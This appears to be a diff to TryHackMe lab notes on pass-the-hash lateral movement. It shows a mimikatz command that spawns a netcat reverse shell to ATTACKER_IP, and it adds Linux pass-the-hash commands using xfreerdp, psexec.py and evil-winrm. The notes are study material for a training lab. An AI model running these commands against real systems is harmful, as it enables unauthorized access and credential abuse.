@@ -230,5 +230,15 @@ user@AttackBox$ nc -lvp 5555
 mimikatz # token::revert
 mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
 ```
+`token::revert`: to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work.  
 
+***Passing the Hash Using Linux:***
+Connect to RDP using PtH:  
+`xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH`  
+Connect via psexec using PtH:  
+`psexec.py -hashes NTLM_HASH DOMAIN/MyUser@VICTIM_IP`  
+Note: Only the linux version of psexec support PtH.  
+Connect to WinRM using PtH:  
+`evil-winrm -i VICTIM_IP -u MyUser -H NTLM_HASH`
 
+### Kerberos Authentication
